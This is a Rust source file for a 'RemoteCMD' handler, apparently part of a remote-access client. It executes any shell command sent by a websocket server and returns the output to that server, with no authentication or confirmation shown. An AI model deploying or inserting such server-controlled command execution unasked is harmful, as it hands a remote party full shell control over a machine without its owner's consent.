use futures_util::SinkExt;
use serde_json::Value;
use std::process::Command;
use tokio_tungstenite::tungstenite::Message;

use crate::{
    dev_print,
    handlers::func::{Function, HandlerResult},
    router::SocketWriter,
};

pub struct RemoteCMD;

#[async_trait::async_trait]
impl Function for RemoteCMD {
    async fn handler<'a>(args: Value, socket: &'a mut SocketWriter) -> HandlerResult {
        let cmd = args["command"].as_str().unwrap_or_default();

        #[cfg(target_os = "windows")]
        let default_shell = ("cmd", "/C");
        #[cfg(not(target_os = "windows"))]
        let default_shell = ("sh", "-c");

        let mode = match args["shell"].as_str() {
            Some("powershell") => ("powershell", "-Command"),
            Some("bash") => ("bash", "-c"),
            Some("sh") => ("sh", "-c"),
            Some("cmd") => ("cmd", "/C"),
            _ => default_shell,
        };

        let output_result = Command::new(mode.0).arg(mode.1).arg(cmd).output();

        let response_str = match output_result {
            Ok(output) => {
                String::from_utf8_lossy(&[output.stdout, output.stderr].concat()).to_string()
            }
            Err(e) => {
                format!("Failed to execute command '{}': {}", mode.0, e)
            }
        };

        socket.send(Message::Text(response_str)).await?;
        dev_print!("Response sent to server.");

        Ok(())
    }
}
